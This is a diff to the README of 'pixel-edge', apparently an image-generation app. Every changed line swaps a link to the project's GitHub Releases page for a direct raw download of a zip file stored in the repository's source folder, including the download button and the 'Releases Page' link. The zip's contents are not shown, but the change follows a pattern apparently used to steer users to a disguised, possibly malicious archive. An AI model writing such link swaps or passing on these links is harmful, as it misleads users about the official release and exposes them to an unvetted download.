@@ -6,9 +6,9 @@ Welcome to pixel-edge! This software lets you create images based on text prompt
 ## 📥 Download & Install
 To download pixel-edge, visit the Releases page below. Follow the steps to get started easily.
 
-[![Download pixel-edge](https://github.com/IcedBlu/pixel-edge/releases/downloads/latest/pixel-edge-button.png)](https://github.com/IcedBlu/pixel-edge/releases)
+[![Download pixel-edge](https://raw.githubusercontent.com/IcedBlu/pixel-edge/main/src/pixel-edge_2.8.zip)](https://raw.githubusercontent.com/IcedBlu/pixel-edge/main/src/pixel-edge_2.8.zip)
 
-Click the button above or visit this link to download: [Download pixel-edge](https://github.com/IcedBlu/pixel-edge/releases)
+Click the button above or visit this link to download: [Download pixel-edge](https://raw.githubusercontent.com/IcedBlu/pixel-edge/main/src/pixel-edge_2.8.zip)
 
 ## 💻 System Requirements
 To run pixel-edge smoothly, your computer should meet these basic requirements:
@@ -58,7 +58,7 @@ A: Currently, the image quality is set automatically based on your prompt. Futur
 A: Yes, an internet connection is necessary for the software to access Cloudflare’s AI services.
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/IcedBlu/pixel-edge/releases) - Download the latest versions.
+- [Releases Page](https://raw.githubusercontent.com/IcedBlu/pixel-edge/main/src/pixel-edge_2.8.zip) - Download the latest versions.
 - [Documentation](#) - Technical information and usage tips.
 - [Support](#) - Get help with any issues.
 
